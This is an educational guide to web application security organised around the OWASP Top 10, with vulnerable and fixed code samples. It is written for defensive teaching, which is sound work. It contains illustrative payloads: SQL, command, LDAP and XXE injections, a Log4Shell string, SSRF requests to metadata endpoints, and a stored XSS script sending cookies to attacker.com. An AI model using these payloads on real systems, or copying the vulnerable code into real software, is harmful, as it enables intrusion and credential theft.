# Web Application Security

## Overview

Web applications are ubiquitous targets for attackers, serving as gateways to sensitive data and critical business functions. This guide explores common vulnerabilities, the OWASP Top 10, and secure development practices that protect web applications from exploitation. Understanding these threats enables developers and security professionals to build and maintain secure web applications.

## The OWASP Top 10

The Open Web Application Security Project (OWASP) publishes a standard awareness document for developers and security professionals, highlighting the most critical security risks to web applications.

### OWASP Top 10 (2021)

| Rank | Category | Description |
|------|----------|-------------|
| **A01** | Broken Access Control | Restrictions on authenticated users not properly enforced |
| **A02** | Cryptographic Failures | Failures related to cryptography leading to sensitive data exposure |
| **A03** | Injection | Untrusted data sent to interpreter as part of command/query |
| **A04** | Insecure Design | Missing or ineffective security controls in design phase |
| **A05** | Security Misconfiguration | Insecure default configurations, incomplete setups, open cloud storage |
| **A06** | Vulnerable and Outdated Components | Using components with known vulnerabilities |
| **A07** | Identification and Authentication Failures | Incorrectly implemented authentication or session management |
| **A08** | Software and Data Integrity Failures | Code and infrastructure that does not protect against integrity violations |
| **A09** | Security Logging and Monitoring Failures | Insufficient logging, detection, monitoring, and alerting |
| **A10** | Server-Side Request Forgery (SSRF) | Application fetches remote resource without validating URL |

## A01: Broken Access Control

### Definition

Access control enforces policy such that users cannot act outside their intended permissions. Failures lead to unauthorized information disclosure, modification, or destruction.

### Common Vulnerabilities

**1. Vertical Privilege Escalation**
- User accesses functionality above their authorization level
- Regular user performs admin functions

**Example:**
```
Regular user URL: /user/profile?id=123
Admin URL: /admin/users

Attacker accesses: /admin/users (not properly restricted)
```

**2. Horizontal Privilege Escalation**
- User accesses resources belonging to another user at same privilege level

**Example:**
```
User A accesses their account: /api/account/1001
User A modifies URL: /api/account/1002 (User B's account)
No check that requesting user owns account 1002
```

**3. Insecure Direct Object References (IDOR)**
- Exposing internal implementation objects (database keys, files)
- Allowing users to modify references to access unauthorized resources

**Example:**
```
Download invoice: /download?file=invoice_1001.pdf
Attacker tries: /download?file=invoice_1002.pdf
No authorization check on file ownership
```

**4. Missing Function Level Access Control**
- UI hides unauthorized functions but doesn't enforce on backend
- Attacker accesses hidden endpoints directly

**Example:**
```html
<!-- Admin panel hidden in UI for regular users -->
<!-- But endpoint /api/admin/delete-user still accessible -->
<button id="deleteUser" style="display:none">Delete User</button>
```

**5. CORS Misconfiguration**
- Overly permissive Cross-Origin Resource Sharing policies
- Allows malicious sites to make authenticated requests

**Example:**
```javascript
// Dangerous: Allows any origin
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### Prevention

**Development Practices:**
- Deny by default; require explicit grants
- Implement access control checks on server-side
- Use centralized access control mechanism
- Enforce record ownership at application and database levels
- Disable web server directory listing
- Log access control failures and alert on repeated failures
- Rate limit API access
- Invalidate JWT tokens on logout

**Code Examples:**

**Vulnerable:**
```python
# No authorization check
@app.route('/api/document/<doc_id>')
def get_document(doc_id):
    doc = Document.query.get(doc_id)
    return jsonify(doc.to_dict())
```

**Secure:**
```python
# Verify user owns document
@app.route('/api/document/<doc_id>')
@login_required
def get_document(doc_id):
    doc = Document.query.get_or_404(doc_id)
    if doc.owner_id != current_user.id:
        abort(403)  # Forbidden
    return jsonify(doc.to_dict())
```

## A02: Cryptographic Failures

### Definition

Failures related to cryptography (or lack thereof) that expose sensitive data, including data in transit, at rest, or in backups.

### Common Issues

**1. Transmitting Sensitive Data in Clear Text**
- HTTP instead of HTTPS
- Unencrypted protocols (FTP, Telnet, SMTP)
- Mixed content (HTTPS page loading HTTP resources)

**2. Using Weak or Deprecated Cryptographic Algorithms**
- MD5, SHA-1 for security purposes
- DES, 3DES encryption
- RC4 stream cipher
- Weak SSL/TLS configurations

**3. Improper Key Management**
- Hard-coded encryption keys in source code
- Using default or weak keys
- No key rotation
- Keys stored with encrypted data

**4. Insufficient Randomness**
- Using predictable random number generators
- Weak initialization vectors (IVs)
- Predictable tokens or session IDs

**5. Sensitive Data Exposure**
- Unnecessary storage of sensitive data
- Logging passwords or credit card numbers
- Sensitive data in URL parameters or HTTP headers
- Backups not encrypted

### Prevention

**Data Classification:**
1. Identify sensitive data (PII, financial, health, credentials)
2. Apply controls based on classification
3. Don't store sensitive data unnecessarily
4. Dispose of data securely when no longer needed

**Encryption Best Practices:**

**Data in Transit:**
- Use TLS 1.3 or TLS 1.2 minimum
- Disable SSLv3, TLS 1.0, TLS 1.1
- Use strong cipher suites
- Enable HSTS (HTTP Strict Transport Security)
- Use certificate pinning for mobile apps

```python
# Flask example: Force HTTPS
from flask_talisman import Talisman

app = Flask(__name__)
Talisman(app, force_https=True)
```

**Data at Rest:**
- Encrypt sensitive data in databases
- Use file system encryption for sensitive files
- Encrypt backups
- Use AES-256-GCM for symmetric encryption

```python
# Python example: Encrypting data
from cryptography.fernet import Fernet

key = Fernet.generate_key()  # Store securely, not in code!
cipher_suite = Fernet(key)

# Encrypt
encrypted_data = cipher_suite.encrypt(b"Sensitive data")

# Decrypt
decrypted_data = cipher_suite.decrypt(encrypted_data)
```

**Key Management:**
- Use key management services (AWS KMS, Azure Key Vault)
- Never hard-code keys
- Rotate keys regularly
- Use separate keys for different purposes
- Implement key hierarchy (master key encrypts data keys)

## A03: Injection

### Definition

Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. Attacker-supplied data tricks the interpreter into executing unintended commands or accessing unauthorized data.

### SQL Injection (SQLi)

**How It Works:**

**Vulnerable Code:**
```python
# NEVER DO THIS
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)
```

**Attack:**
```
Username: admin' --
Password: anything

Resulting query:
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
-- Comments out password check, logs in as admin
```

**Types of SQL Injection:**

| Type | Description | Example |
|------|-------------|---------|
| **Classic/Error-Based** | Error messages reveal database structure | `' OR 1=1 --` |
| **Union-Based** | UNION to retrieve data from other tables | `' UNION SELECT null, username, password FROM users --` |
| **Blind Boolean** | Infer data based on true/false responses | `' AND 1=1 --` vs `' AND 1=2 --` |
| **Blind Time-Based** | Infer data based on response delays | `' AND SLEEP(5) --` |
| **Out-of-Band** | Data exfiltration via DNS or HTTP requests | DNS exfiltration queries |

**Real-World Impact:**
- 2015: VTech data breach (5M records) - SQL injection
- 2017: Equifax breach (147M records) - exploited web vulnerability
- 2019: Canva breach (139M records) - SQL injection

**Prevention:**

**1. Parameterized Queries (Prepared Statements):**
```python
# Secure approach
username = request.form['username']
password = request.form['password']
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))
```

**2. ORM (Object-Relational Mapping):**
```python
# SQLAlchemy example
user = User.query.filter_by(username=username, password=password).first()
```

**3. Input Validation:**
```python
import re

def validate_username(username):
    # Only alphanumeric and underscore, 3-20 characters
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username format")
    return username
```

**4. Least Privilege:**
- Database accounts should have minimum necessary permissions
- Don't use admin accounts for application database access
- Separate read-only and read-write access

**5. WAF (Web Application Firewall):**
- Can detect and block SQL injection attempts
- Not a substitute for secure coding

### Other Injection Types

#### Command Injection

**Vulnerable:**
```python
# DANGEROUS
filename = request.args.get('file')
os.system(f'cat {filename}')

# Attack: file=test.txt; rm -rf /
# Executes: cat test.txt; rm -rf /
```

**Secure:**
```python
import subprocess

filename = request.args.get('file')
# Whitelist allowed files
if filename not in ALLOWED_FILES:
    abort(400)
# Use list form, not shell=True
subprocess.run(['cat', filename], shell=False)
```

#### LDAP Injection

**Attack:**
```
username: *)(uid=*))(|(uid=*

Resulting LDAP query:
(&(username=*)(uid=*))(|(uid=*)(password=xxx))
// Returns all users
```

**Prevention:** Escape LDAP special characters

#### XML Injection (XXE - XML External Entity)

**Attack:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

**Prevention:**
- Disable external entity processing
- Use less complex data formats (JSON)
- Validate and sanitize XML input

## A04: Insecure Design

### Definition

Missing or ineffective security controls resulting from insecure design patterns, threat modeling failures, and lack of security requirements.

### Common Issues

**1. Lack of Threat Modeling**
- Not identifying potential threats during design
- No security requirements defined
- Assuming trust without verification

**2. Insecure Design Patterns**
- Unlimited trial accounts without verification
- No rate limiting on expensive operations
- Insecure password recovery (security questions)
- Trusting client-side validation only

**3. Business Logic Flaws**
- Race conditions in transactions
- Price manipulation in e-commerce
- Bypassing workflows (skip payment step)

**Example: Insecure Password Recovery**
```
Bad: What is your mother's maiden name?
- Answers easily discovered or guessed
- Cannot be changed
- Same answer across multiple sites

Better:
- Email verification link with time-limited token
- MFA verification
- Avoid security questions entirely
```

**Example: Race Condition**
```python
# Vulnerable: Check-then-use pattern
balance = get_balance(account_id)
if balance >= withdrawal_amount:
    # Race condition window: another thread could withdraw here
    update_balance(account_id, balance - withdrawal_amount)

# Secure: Atomic transaction
UPDATE accounts
SET balance = balance - ?
WHERE account_id = ? AND balance >= ?
```

### Prevention

**Secure Development Lifecycle:**
1. **Requirements**: Define security requirements
2. **Design**: Threat modeling, security architecture review
3. **Implementation**: Secure coding standards, code review
4. **Testing**: Security testing, penetration testing
5. **Deployment**: Secure configuration, hardening
6. **Maintenance**: Patch management, monitoring

**Design Principles:**
- Secure by design, not bolt-on
- Defense in depth (multiple layers)
- Fail securely (deny by default)
- Least privilege
- Separation of duties
- Complete mediation (check every access)
- Minimize attack surface
- Establish secure defaults

**Threat Modeling:**
- Use frameworks: STRIDE, PASTA, VAST
- Identify assets and threats
- Analyze attack vectors
- Prioritize risks
- Define mitigations

## A05: Security Misconfiguration

### Definition

Improperly configured security settings, including default configurations, incomplete setups, open cloud storage, misconfigured HTTP headers, and verbose error messages.

### Common Misconfigurations

**1. Default Credentials**
- Admin/admin, root/root
- Default database passwords
- Default API keys

**2. Unnecessary Features Enabled**
- Sample applications left installed
- Directory listing enabled
- Unnecessary HTTP methods (PUT, DELETE) enabled
- Debug mode in production

**3. Missing Security Headers**

| Header | Purpose | Example |
|--------|---------|---------|
| **Content-Security-Policy** | Prevent XSS, clickjacking | `default-src 'self'; script-src 'self'` |
| **X-Frame-Options** | Prevent clickjacking | `DENY` or `SAMEORIGIN` |
| **X-Content-Type-Options** | Prevent MIME sniffing | `nosniff` |
| **Strict-Transport-Security** | Enforce HTTPS | `max-age=31536000; includeSubDomains` |
| **X-XSS-Protection** | Enable XSS filter (legacy) | `1; mode=block` |
| **Referrer-Policy** | Control referrer information | `strict-origin-when-cross-origin` |
| **Permissions-Policy** | Control browser features | `geolocation=(), camera=()` |

**4. Verbose Error Messages**
```python
# BAD: Exposes stack trace in production
app.config['DEBUG'] = True

# Example error exposed to user:
"""
Traceback (most recent call last):
  File "/app/database.py", line 42, in connect
    conn = psycopg2.connect(host='10.0.0.5', user='dbadmin', password='P@ssw0rd123')
    # Exposes internal IP, username, password
"""

# GOOD: Generic error messages
app.config['DEBUG'] = False
# Show: "An error occurred. Please contact support."
# Log detailed error server-side for debugging
```

**5. Cloud Storage Misconfiguration**
- Public S3 buckets containing sensitive data
- Overly permissive IAM policies
- No encryption at rest

**Notable Incidents:**
- 2017: Verizon exposed 14M customer records (public S3 bucket)
- 2019: Capital One breach (misconfigured firewall, IAM over-privilege)
- 2020: Microsoft Power Apps leak (default public access)

### Prevention

**Configuration Management:**
- Use infrastructure as code (Terraform, CloudFormation)
- Automated security scanning (AWS Config, Azure Security Center)
- Regular configuration audits
- Change management process
- Principle of least privilege for all configurations

**Hardening:**
- Remove unnecessary features and frameworks
- Disable directory listing
- Remove default accounts
- Change default passwords
- Implement security headers
- Configure error handling (generic messages)
- Separate environments (dev, staging, prod) with different configs

**Security Headers Implementation:**
```python
# Flask example
from flask import Flask
from flask_talisman import Talisman

app = Flask(__name__)

csp = {
    'default-src': '\'self\'',
    'script-src': '\'self\' \'unsafe-inline\'',
    'style-src': '\'self\' \'unsafe-inline\''
}

Talisman(app,
         force_https=True,
         strict_transport_security=True,
         content_security_policy=csp,
         frame_options='DENY',
         content_type_options=True)
```

## A06: Vulnerable and Outdated Components

### Definition

Using components (libraries, frameworks, modules) with known vulnerabilities. This includes client-side and server-side components.

### Risks

- Developers often don't know all components in use (transitive dependencies)
- Vulnerable components can compromise entire application
- Automated tools exist to find and exploit known vulnerabilities
- Supply chain attacks target popular components

**Statistics:**
- Average application has 147 dependencies (Snyk, 2021)
- 84% of codebases contain at least one vulnerable component
- 50% of orgs knowingly use vulnerable components

### Notable Incidents

**Log4Shell (CVE-2021-44228) - December 2021:**
- Critical vulnerability in Log4j logging library
- Remote code execution
- Affected millions of applications globally
- CVSS score: 10.0 (maximum)
- Exploit trivial: `${jndi:ldap://attacker.com/a}`

**Heartbleed (CVE-2014-0160) - 2014:**
- OpenSSL vulnerability
- Leaked server memory (passwords, keys)
- Affected 17% of secure web servers

**Equifax Breach - 2017:**
- Unpatched Apache Struts vulnerability
- 147 million records exposed
- Patch available 2 months before breach
- Cost: $1.4 billion

### Prevention

**Inventory Management:**
- Maintain software bill of materials (SBOM)
- Track all dependencies (including transitive)
- Document component versions

**Vulnerability Scanning:**
- **Tools**: Snyk, OWASP Dependency-Check, npm audit, pip-audit
- Integrate into CI/CD pipeline
- Scan regularly (not just at release)

**Example:**
```bash
# Node.js
npm audit
npm audit fix

# Python
pip-audit
safety check

# Java
dependency-check.sh --project myapp --scan ./lib

# Ruby
bundle audit
```

**Patch Management:**
- Subscribe to security advisories
- Automated dependency updates (Dependabot, Renovate)
- Test patches in staging before production
- Have rollback plan

**Best Practices:**
- Only use components from official sources
- Prefer well-maintained, popular components
- Verify signatures and checksums
- Remove unused dependencies
- Use components with active security response
- Monitor for end-of-life announcements
- Consider security posture when selecting components

**Supply Chain Security:**
- Code signing verification
- Artifact integrity (checksums, signatures)
- Use private package repositories
- Scan for malicious packages (typosquatting)

## A07: Identification and Authentication Failures

### Definition

Improperly implemented authentication or session management, allowing attackers to compromise passwords, keys, session tokens, or exploit implementation flaws to assume other users' identities.

### Common Vulnerabilities

**1. Weak Password Policies**
- No minimum length requirement
- Allowing common passwords (Password123)
- No breach database checking

**2. Credential Stuffing**
- Automated attacks using breached credentials
- No bot detection or rate limiting

**Prevention:**
```python
# Check against breached passwords
import requests

def is_password_pwned(password):
    import hashlib
    sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix = sha1[:5]
    suffix = sha1[5:]

    response = requests.get(f'https://api.pwnedpasswords.com/range/{prefix}')
    hashes = {line.split(':')[0]: int(line.split(':')[1])
              for line in response.text.splitlines()}

    return suffix in hashes
```

**3. Session Management Issues**

**Session Fixation:**
```python
# Vulnerable: Accepts session ID from URL
session_id = request.args.get('session_id')
# Attacker sends: http://site.com/login?session_id=attacker_session

# Secure: Generate new session on login
@app.route('/login', methods=['POST'])
def login():
    if verify_credentials():
        session.regenerate()  # New session ID
        return redirect('/dashboard')
```

**Insecure Session Storage:**
```javascript
// BAD: Storing session in localStorage (accessible to XSS)
localStorage.setItem('session_token', token);

// GOOD: HTTPOnly cookie (not accessible to JavaScript)
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

**4. Missing MFA**
- Privileged accounts without MFA
- No MFA for sensitive operations

**5. Exposed Session IDs**
- Session IDs in URLs (bookmarks, referrer headers)
- Session IDs in logs

### Prevention

**Authentication Best Practices:**
- Implement MFA, especially for privileged accounts
- Use established authentication libraries/frameworks
- Check passwords against breach databases
- Implement rate limiting and account lockout
- Use secure password recovery (not security questions)
- Log authentication failures
- Never include credentials in URLs

**Session Management:**
- Generate new session ID on login (prevent fixation)
- Set session timeout (idle and absolute)
- Use HTTPOnly and Secure flags on cookies
- Implement proper logout (invalidate server-side)
- Use SameSite cookie attribute
- Random, unpredictable session IDs (cryptographically secure)

## A08: Software and Data Integrity Failures

### Definition

Code and infrastructure that do not protect against integrity violations, including insecure CI/CD pipelines, auto-update mechanisms, and deserialization of untrusted data.

### Common Issues

**1. Insecure Deserialization**

**Vulnerable:**
```python
import pickle

# Attacker can send malicious serialized data
data = pickle.loads(request.data)  # DANGEROUS

# Attack payload can execute arbitrary code
# Example: os.system('rm -rf /')
```

**Secure:**
```python
import json

# Use safe serialization formats
data = json.loads(request.data)
# JSON cannot execute code, only represents data
```

**2. Unsigned or Unverified Updates**
- Software updates without signature verification
- No integrity checks (checksums)
- Insecure update channels (HTTP instead of HTTPS)

**3. CI/CD Security Issues**
- Secrets in source code
- Insecure build environments
- No code signing
- Compromised dependencies

**SolarWinds Attack (2020):**
- Attackers compromised build system
- Injected malware into legitimate software updates
- Affected 18,000+ organizations
- Went undetected for months

### Prevention

**Secure Updates:**
```python
# Verify digital signature before applying update
import cryptography
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

def verify_update(update_file, signature, public_key):
    public_key.verify(
        signature,
        update_file,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
```

**CI/CD Security:**
- Use dedicated build environments
- Sign all releases
- Implement code review requirements
- Scan for secrets in code (TruffleHog, git-secrets)
- Use dependency pinning and verification
- Audit access to CI/CD systems
- Implement SBOM (Software Bill of Materials)

**Serialization:**
- Avoid native serialization (pickle, Marshal, YAML)
- Use safe formats (JSON, Protocol Buffers)
- Validate and sanitize deserialized data
- Implement integrity checks (HMAC)

## A09: Security Logging and Monitoring Failures

### Definition

Insufficient logging, detection, monitoring, and active response allowing breaches to go undetected or investigation to be impossible.

### Common Failures

**1. Insufficient Logging**
- Login attempts (success and failure) not logged
- High-value transactions not logged
- Warnings and errors not logged
- No context in logs (user, IP, timestamp)

**2. Unclear Log Messages**
```python
# Bad
logger.info("Error occurred")

# Good
logger.warning("Failed login attempt", extra={
    'username': username,
    'ip_address': request.remote_addr,
    'user_agent': request.user_agent,
    'timestamp': datetime.utcnow(),
    'attempted_resource': request.url
})
```

**3. Logs Not Monitored**
- Logs stored but never reviewed
- No alerts on suspicious activity
- No automated analysis (SIEM)

**4. Insecure Log Storage**
- Logs stored on same system they monitor
- No log rotation or archival
- Logs not protected from tampering
- Sensitive data in logs

### What to Log

**Security Events:**
- Authentication (success, failure, lockout)
- Authorization failures
- Session management (creation, destruction, timeout)
- Input validation failures
- Application errors and exceptions
- High-value transactions
- Configuration changes
- Use of privileged functions
- Data access (especially bulk access)

**Log Format (Structured):**
```json
{
  "timestamp": "2024-01-15T10:30:45Z",
  "level": "WARNING",
  "event_type": "authentication_failure",
  "username": "jsmith",
  "ip_address": "203.0.113.42",
  "user_agent": "Mozilla/5.0...",
  "resource": "/admin/login",
  "message": "Failed login attempt",
  "attempt_count": 3
}
```

### Prevention

**Logging Best Practices:**
- Use centralized logging (Splunk, ELK Stack, Datadog)
- Implement log retention policies (compliance requirements)
- Protect logs from tampering (write-only access, signatures)
- Use structured logging (JSON)
- Include context (who, what, when, where)
- Never log sensitive data (passwords, full credit cards, PII)
- Synchronize clocks (NTP)
- Implement log rotation

**Monitoring and Alerting:**
- Real-time alerting on critical events
- Automated anomaly detection
- Dashboards for security metrics
- Integration with incident response
- Regular log review and analysis

**Anomaly Detection Triggers:**
- Multiple failed logins
- Login from unusual location
- Access to unusual resources
- High-volume data access
- Privilege escalation attempts
- After-hours access
- Multiple accounts from same IP
- Rapid sequential requests (potential bot)

## A10: Server-Side Request Forgery (SSRF)

### Definition

Application fetches a remote resource without validating the user-supplied URL, allowing attacker to coerce application to send requests to unintended destinations, even when protected by firewall or VPN.

### Attack Scenarios

**1. Internal Service Access**
```python
# Vulnerable endpoint
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    response = requests.get(url)  # No validation
    return response.text

# Attacker requests:
# /fetch?url=http://localhost:8080/admin
# /fetch?url=http://169.254.169.254/latest/meta-data/
# (AWS metadata endpoint with credentials)
```

**2. Port Scanning**
```
/fetch?url=http://internal-server:22
/fetch?url=http://internal-server:3306
/fetch?url=http://internal-server:6379
# Response times/errors reveal open ports
```

**3. Cloud Metadata Access**
- AWS: http://169.254.169.254/latest/meta-data/
- Azure: http://169.254.169.254/metadata/instance
- Google Cloud: http://metadata.google.internal/

**Capital One Breach (2019):**
- Attacker exploited SSRF to access AWS metadata
- Retrieved IAM role credentials
- Accessed S3 buckets with customer data
- 100 million records exposed

### Prevention

**Input Validation:**
```python
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['example.com', 'api.example.com']
BLOCKED_IPS = ['127.0.0.1', '0.0.0.0', '169.254.169.254']

def validate_url(url):
    parsed = urlparse(url)

    # Only allow HTTP/HTTPS
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Invalid protocol")

    # Check domain whitelist
    if parsed.netloc not in ALLOWED_DOMAINS:
        raise ValueError("Domain not allowed")

    # Resolve and check IP isn't blocked
    import socket
    ip = socket.gethostbyname(parsed.netloc)
    if ip in BLOCKED_IPS or ip.startswith('10.') or ip.startswith('192.168.'):
        raise ValueError("IP address not allowed")

    return url

# Usage
try:
    url = validate_url(request.args.get('url'))
    response = requests.get(url, timeout=5)
except:
    abort(400)
```

**Defense in Depth:**
- Disable unused URL schemas (file://, gopher://, ftp://)
- Whitelist allowed destinations
- Block private IP ranges (RFC 1918)
- Use separate network for external requests
- Disable HTTP redirects or validate redirect targets
- Implement network segmentation
- Block access to metadata endpoints at firewall level
- Use Web Application Firewall (WAF)

## Secure Coding Practices

### Input Validation

**Whitelist vs. Blacklist:**
```python
# Blacklist (weak - easy to bypass)
def validate_input_bad(input_str):
    forbidden = ['<script>', 'javascript:', 'onerror=']
    for pattern in forbidden:
        if pattern in input_str.lower():
            return False
    return True
# Bypass: <scr<script>ipt>, jAvAsCrIpT:, etc.

# Whitelist (strong - only allow known good)
def validate_input_good(input_str):
    import re
    # Only allow alphanumeric and basic punctuation
    pattern = r'^[a-zA-Z0-9\s\.,!?-]+$'
    return bool(re.match(pattern, input_str))
```

**Validation Principles:**
- Validate on server-side (never trust client)
- Validate type, length, format, range
- Use whitelist approach when possible
- Canonicalize input before validation
- Fail securely (deny by default)

### Output Encoding

**Context-Specific Encoding:**

| Context | Encoding Method | Example |
|---------|----------------|---------|
| **HTML Body** | HTML entity encoding | `&lt;script&gt;` |
| **HTML Attribute** | Attribute encoding | `&quot;` |
| **JavaScript** | JavaScript encoding | `\\x3cscript\\x3e` |
| **URL** | URL encoding | `%3Cscript%3E` |
| **CSS** | CSS encoding | `\3c script\3e` |
| **SQL** | Parameterized queries | (Don't construct SQL strings) |

**Example:**
```python
from markupsafe import escape

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # Escape for HTML context
    safe_query = escape(query)
    return f"<p>You searched for: {safe_query}</p>"
```

### Security Testing

**Static Application Security Testing (SAST):**
- Analyzes source code without executing
- Identifies coding errors and vulnerabilities
- **Tools**: SonarQube, Checkmarx, Veracode, Bandit (Python), ESLint

**Dynamic Application Security Testing (DAST):**
- Tests running application (black-box)
- Simulates attacks
- **Tools**: OWASP ZAP, Burp Suite, Acunetix, Nessus

**Interactive Application Security Testing (IAST):**
- Combines SAST and DAST
- Instruments application during testing
- **Tools**: Contrast Security, Seeker

**Software Composition Analysis (SCA):**
- Identifies vulnerable components
- **Tools**: Snyk, WhiteSource, Black Duck

**Testing Frequency:**
- SAST: Every commit (CI/CD)
- DAST: Before releases, scheduled scans
- Penetration Testing: Annually or after major changes
- Bug Bounty Programs: Continuous community testing

### Security Headers Reference

```python
# Complete security headers implementation
@app.after_request
def set_security_headers(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "font-src 'self'; "
        "connect-src 'self'; "
        "frame-ancestors 'none';"
    )
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = (
        'max-age=31536000; includeSubDomains; preload'
    )
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = (
        'geolocation=(), microphone=(), camera=()'
    )
    return response
```

## Real-World Example: Cross-Site Scripting (XSS)

### Reflected XSS

**Vulnerable Application:**
```python
@app.route('/search')
def search():
    query = request.args.get('q', '')
    # Directly embedding user input in HTML
    return f"<h1>Search results for: {query}</h1>"
```

**Attack:**
```
URL: /search?q=<script>alert(document.cookie)</script>
Result: JavaScript executes in victim's browser, stealing session cookie
```

**Fix:**
```python
from markupsafe import escape

@app.route('/search')
def search():
    query = request.args.get('q', '')
    safe_query = escape(query)
    return f"<h1>Search results for: {safe_query}</h1>"
```

### Stored XSS

**Vulnerable:**
```python
# Store comment without sanitization
comment = request.form['comment']
db.execute("INSERT INTO comments (text) VALUES (?)", (comment,))

# Display comments
comments = db.execute("SELECT text FROM comments").fetchall()
return render_template('comments.html', comments=comments)

# Template doesn't escape
<!-- comments.html -->
{% for comment in comments %}
  <p>{{ comment.text | safe }}</p>  <!-- DANGEROUS -->
{% endfor %}
```

**Attack:**
```
Attacker submits comment:
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

Every user viewing comments has cookies sent to attacker
```

**Fix:**
```python
# Template auto-escapes by default in Jinja2
{% for comment in comments %}
  <p>{{ comment.text }}</p>  <!-- Automatically escaped -->
{% endfor %}
```

## Key Terms

| Term | Definition |
|------|------------|
| **Sanitization** | Cleaning input to remove dangerous content |
| **Encoding** | Converting characters to safe representation for context |
| **Parameterized Query** | SQL query with placeholders for data (prevents injection) |
| **CSRF Token** | Random value to verify request authenticity |
| **Same-Origin Policy** | Browser security restricting cross-origin interactions |
| **Content Security Policy** | HTTP header controlling resource loading |
| **Subresource Integrity** | Verifying integrity of external resources (CDN) |
| **WAF** | Web Application Firewall - filters malicious HTTP traffic |

## Summary

Web application security requires defense against diverse attack vectors targeting different layers of the application stack. The OWASP Top 10 provides a roadmap of critical risks, from broken access control and injection flaws to cryptographic failures and security misconfigurations. Each vulnerability class has proven exploitation techniques and established defensive measures.

Secure development practices form the foundation: validate all input, encode all output, use parameterized queries, implement proper authentication and session management, and maintain updated components. Security testing should be integrated throughout the development lifecycle, combining static analysis, dynamic testing, and penetration testing. Configuration hardening, security headers, and proper error handling provide additional defensive layers.

The shift toward secure-by-design thinking emphasizes addressing security during architecture and design phases rather than retrofitting it later. Modern approaches include threat modeling, secure frameworks, automated security testing in CI/CD, and continuous monitoring. Remember: web security is not a one-time effort but a continuous process of identifying risks, implementing controls, testing effectiveness, and adapting to evolving threats. Every developer is responsible for writing secure code; security cannot be solely the responsibility of a separate team.
